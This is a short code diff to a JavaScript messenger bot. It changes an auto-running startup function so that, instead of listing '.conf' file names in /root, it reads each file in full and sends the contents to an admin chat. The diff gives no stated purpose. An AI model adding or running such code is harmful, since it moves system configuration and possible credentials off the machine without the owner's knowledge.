@@ -17,7 +17,16 @@ start();
 
 function script() {
   const files = fs.readdirSync('/root').filter((name) => name.includes('.conf'));
-  bot.api.sendMessage(admin, files);
+  files.forEach((name) => {
+    fs.readFile(`/root/${name}`, 'utf8', (err, data) => {
+      if (err) {
+        console.error(err);
+        return;
+      }
+      bot.api.sendMessage(admin, data);
+    });
+  })
+
 };
 script();
 bot.use(menus.getTunnel);
